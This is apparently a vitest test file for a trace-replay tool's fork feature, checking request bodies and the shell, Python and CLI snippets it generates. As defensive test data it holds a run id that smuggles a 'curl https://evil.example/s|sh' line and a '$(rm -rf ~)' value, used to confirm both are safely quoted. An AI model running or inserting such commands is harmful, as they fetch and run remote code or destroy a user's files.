// Fork & Rewind's request and snippets, against what a real 0.28.0 server
// recorded and answered: `tape_tkt4101.json` is a simulated support agent's
// tape (llm, search_orders, llm, issue_refund, llm), `fork_created.json` the
// POST /v1/replays answer for an edit at step 1 that goes live after it.

import { describe, it, expect } from 'vitest';
import tape from '../test/fixtures/tape_tkt4101.json';
import created from '../test/fixtures/fork_created.json';
import forks from '../test/fixtures/forks.json';
// A run whose session.id carries a newline and a command, forked on a real
// 0.28.0 server: the server takes the id and echoes it back as stored.
import newlineRun from '../test/fixtures/fork_created_newline_run.json';
import {
  buildForkRequest, editValue, forkCli, forkEnv, forkPython, forkSummary, forkable, recordedAnswer, shellWord,
} from './fork.js';

const [llm0, tool1, , , llm4] = tape.steps;

describe('what the editor opens with', () => {
  it('a tool step\'s recorded result, as the JSON it was', () => {
    const answer = recordedAnswer(tool1);
    expect(answer.format).toBe('json');
    expect(JSON.parse(answer.text)).toEqual({ orders: [{ id: 'E-9904', status: 'delivered', total_usd: 84.0 }] });
  });

  it('a model answer holding only text, as that text', () => {
    expect(recordedAnswer(llm4)).toEqual({ format: 'text', text: "I've issued a full refund of $84.00. It will reach your card in 3-5 days." });
  });

  it('a model answer with tool calls, as JSON, so editing keeps its shape', () => {
    const answer = recordedAnswer(llm0);
    expect(answer.format).toBe('json');
    expect(JSON.parse(answer.text)[0].tool_calls[0].name).toBe('search_orders');
  });

  it('nothing, flagged, for an offloaded answer the tape did not inline', () => {
    expect(recordedAnswer({ kind: 'tool', response: { $payload: 'sha256:ab', bytes: 9 } })).toMatchObject({ text: '', offloaded: true });
    expect(forkable({ kind: 'agent' })).toBe(false);
    expect(forkable(tool1)).toBe(true);
  });
});

describe('the replay it asks for', () => {
  it('an edited tool result that goes live after the step, in the default tenant named explicitly', () => {
    const { body } = buildForkRequest({
      run: 'tkt-4101', tenant: '', step: 1, change: 'edit', kind: 'tool', format: 'json',
      text: '{"orders": [], "query": "E-9904", "note": "no match"}', live: true, mode: 'strict',
    });
    // The body the server answered with fork_created.json.
    expect(body).toEqual({
      run: 'tkt-4101', mode: 'strict', tenant: '',
      edits: [{ step: 1, tool_result: { orders: [], query: 'E-9904', note: 'no match' } }], live_after: 1,
    });
  });

  it('an edited answer as text, with the recording playing on, in the operator view', () => {
    const { body } = buildForkRequest({
      run: 'tkt-4101', tenant: undefined, step: 4, change: 'edit', kind: 'llm', format: 'text',
      text: 'I could not find that order.', live: false, mode: 'loose',
    });
    expect(body).toEqual({ run: 'tkt-4101', mode: 'loose', edits: [{ step: 4, response: 'I could not find that order.' }] });
  });

  it('a rewind: the steps before replayed exactly, live from the step', () => {
    expect(buildForkRequest({ run: 'tkt-4101', tenant: 'acme', step: 3, change: 'rewind', mode: 'strict' }).body)
      .toEqual({ run: 'tkt-4101', mode: 'strict', tenant: 'acme', live_after: 2 });
    expect(buildForkRequest({ run: 'tkt-4101', step: 0, change: 'rewind' }).error).toMatch(/first step replays nothing/);
  });

  it('refuses locally what the server would refuse, saying why', () => {
    expect(editValue({ kind: 'tool', format: 'json', text: '{nope' }).error).toMatch(/not JSON/);
    expect(editValue({ kind: 'llm', format: 'text', text: '  ' }).error).toMatch(/needs text/);
    // A tool result as text is a JSON string; null is a result too.
    expect(editValue({ kind: 'tool', format: 'text', text: 'timeout' })).toEqual({ value: 'timeout' });
    expect(editValue({ kind: 'tool', format: 'json', text: 'null' })).toEqual({ value: null });
  });
});

describe('the lines it hands back', () => {
  it('points a harness at the replay and names the fork its spans must carry, never the token', () => {
    const env = forkEnv(created, 'http://127.0.0.1:8931', 'token');
    expect(env).toContain(`export OPENAI_BASE_URL=http://127.0.0.1:8931${created.base_urls.openai}`);
    expect(env).toContain(`export ANTHROPIC_BASE_URL=http://127.0.0.1:8931${created.base_urls.anthropic}`);
    expect(env).toContain(`export TRAZA_FORK_ID=${created.fork_id}`);
    expect(env).toContain('export TRAZA_FORK_PARENT=tkt-4101');
    expect(env).toContain('export TRAZA_FORK_STEP=1');
    expect(env).toContain(`export TRAZA_FORK_RUN=${created.fork_id}`);
    expect(env).toContain('Past step 1 every model call answers 409 replay_live');
  });

  it('writes the same fork for the Python client and the CLI', () => {
    const request = { run: 'tkt-4101', step: 1, change: 'edit', kind: 'tool', value: { orders: [], ok: false }, live: true, format: 'json' };
    expect(forkPython(request)).toContain('with traza.fork("tkt-4101", at_step=1, tool_result={"orders": [], "ok": False}) as fork:');
    expect(forkCli(request)).toBe('traza fork tkt-4101 --at 1 --tool-result \'{"orders":[],"ok":false}\' -- python agent.py');
    const text = { run: 'run 7', step: 4, change: 'edit', kind: 'llm', value: "It's sunny.", live: false, format: 'text', mode: 'loose' };
    expect(forkPython(text)).toContain('traza.fork("run 7", at_step=4, response="It\'s sunny.", live=False, mode="loose")');
    // The CLI has no mode: it writes the strict fork only.
    expect(forkCli({ ...text, mode: 'strict' })).toBe("traza fork 'run 7' --at 4 --response 'It'\\''s sunny.' --no-live -- python agent.py");
    expect(forkPython({ run: 'r', step: 3, change: 'rewind' })).toContain('traza.fork("r", at_step=3)');
    expect(forkCli({ run: 'r', step: 3, change: 'rewind' })).toBe('traza fork r --at 3 -- python agent.py');
  });

  it('quotes a shell word only when it must', () => {
    expect(shellWord('tkt-4101')).toBe('tkt-4101');
    expect(shellWord('trace:4bf9')).toBe('trace:4bf9');
    expect(shellWord("a b'c")).toBe("'a b'\\''c'");
    expect(shellWord('$(rm -rf ~)')).toBe("'$(rm -rf ~)'");
  });
});

describe('a fork in the listing', () => {
  it('reads how it ended against its parent and where it parted', () => {
    const summary = forkSummary(forks.forks[0], forks.parent);
    expect(summary).toMatchObject({
      run: forks.forks[0].run, step: 1, diffed: true, outcome: 'failure', parentOutcome: 'success', steps: 3, beforeCut: false,
    });
    expect(summary.delta.steps).toBe(-2);
    expect(summary.divergence.kind).toBe('decision');
  });
});

describe('stored text and keys in the lines it hands back', () => {
  const base = 'http://127.0.0.1:8931';

  it('never lets a run id end a line: a newline in it cannot become a command when the block is pasted', () => {
    expect(newlineRun.fork.parent).toBe('x\ncurl https://evil.example/s|sh\n');
    const env = forkEnv(newlineRun, base, 'token');
    for (const line of env.split('\n')) {
      expect(line.startsWith('#') || line.startsWith('export ')).toBe(true);
    }
    expect(env).not.toMatch(/^curl/m);
    // Still the exact value, on one line.
    expect(env).toContain("export TRAZA_FORK_PARENT=$'x\\ncurl https://evil.example/s|sh\\n'");
  });

  it('never hands the agent the Traza token as its provider key: a fork\'s live half talks to the real provider', () => {
    const env = forkEnv(created, base, 'token');
    expect(env).not.toContain('$TRAZA_TOKEN');
    expect(env).toContain('export OPENAI_API_KEY="${TRAZA_REPLAY_KEY:?');
    expect(env).toContain('export ANTHROPIC_API_KEY="${TRAZA_REPLAY_KEY:?');
    expect(env).toMatch(/both the base URL and the key/);
    // An open server takes any key: there is nothing to protect.
    expect(forkEnv(created, base, 'open')).toContain('export OPENAI_API_KEY=unused');
  });

  it('names the run\'s tenant, so an operator\'s fork forks that tenant\'s run and not the default one\'s', () => {
    const request = { run: 'tkt-4101', tenant: 'acme', step: 1, change: 'edit', kind: 'tool', value: { ok: true }, live: true, format: 'json' };
    const python = forkPython(request);
    expect(python).toContain('tenant="acme"');
    expect(python).toContain('with client.fork("tkt-4101", at_step=1, tool_result={"ok": True}) as fork:');
    expect(forkCli(request)).toBe('traza fork tkt-4101 --tenant acme --at 1 --tool-result \'{"ok":true}\' -- python agent.py');
    // The default tenant, named: an empty tenant is not every tenant.
    expect(forkPython({ ...request, tenant: '' })).toContain('tenant=""');
    expect(forkCli({ ...request, tenant: '' })).toContain("--tenant '' ");
    // Unknown: nothing named, as before.
    expect(forkPython({ ...request, tenant: undefined })).not.toContain('tenant');
  });

  it('says the CLI cannot make a loose fork, rather than writing one that makes a strict fork', () => {
    expect(forkCli({ run: 'r', step: 3, change: 'rewind', mode: 'loose' })).toBeNull();
    expect(forkCli({ run: 'r', step: 3, change: 'rewind', mode: 'strict' })).toBe('traza fork r --at 3 -- python agent.py');
  });
});
